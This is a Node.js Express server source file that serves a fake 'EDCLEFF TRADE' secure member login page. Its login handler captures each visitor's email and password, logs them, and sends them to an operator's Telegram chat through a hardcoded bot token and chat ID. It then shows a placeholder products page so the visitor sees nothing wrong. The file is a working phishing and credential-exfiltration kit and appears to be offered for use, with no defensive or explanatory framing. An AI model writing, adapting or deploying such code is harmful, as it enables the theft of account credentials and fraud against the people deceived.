const express = require('express');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

// YOUR TELEGRAM BOT DETAILS
const BOT_TOKEN = '8776500357:AAF_8kD26cKyjulIiida3tULY7ZjdrJBryw';
const CHAT_ID = '7623047017';

console.log('🚀 Server starting with Telegram bot');

// LANDING PAGE
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html>
<head>
  <title>EDCLEFF TRADE</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:Arial;background:linear-gradient(135deg,#0b1a2e,#1a3a4a);min-height:100vh;display:flex;justify-content:center;align-items:center}
    .box{background:white;padding:40px;border-radius:20px;text-align:center;width:350px}
    h1{color:#1a3c4a;margin-bottom:10px}
    input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:30px}
    button{background:#1f5e7e;color:white;padding:12px;border:none;border-radius:30px;width:100%;font-size:16px;cursor:pointer}
    button:hover{background:#0e4a64}
  </style>
</head>
<body>
  <div class="box">
    <h1>✦ EDCLEFF TRADE ✦</h1>
    <p>Secure Member Gateway</p>
    <form action="/login" method="POST">
      <input type="email" name="email" placeholder="Email Address" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">ACCESS GOODS →</button>
    </form>
  </div>
</body>
</html>`);
});

// LOGIN HANDLER
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  
  console.log('\n🔐 NEW LOGIN!');
  console.log('Email:', email);
  console.log('Password:', password);
  
  // Send to Telegram
  const message = `🔐 NEW LOGIN - EDCLEFF TRADE 🔐%0A%0A📧 Email: ${email}%0A🔒 Password: ${password}%0A🕐 Time: ${new Date().toISOString()}`;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
  
  https.get(url, (telegramRes) => {
    console.log('Telegram response status:', telegramRes.statusCode);
    let data = '';
    telegramRes.on('data', chunk => data += chunk);
    telegramRes.on('end', () => {
      if (data.includes('"ok":true')) {
        console.log('✅ Telegram message sent!');
      } else {
        console.log('❌ Telegram error:', data);
      }
    });
  }).on('error', (err) => {
    console.log('❌ Telegram request error:', err.message);
  });
  
  // PRODUCTS PAGE (simplified for speed)
  res.send(`<h1>Welcome to EDCLEFF TRADE</h1><p>Products page</p><a href="/">Logout</a>`);
});

app.listen(PORT, () => {
  console.log('✅ Server running on port', PORT);
});
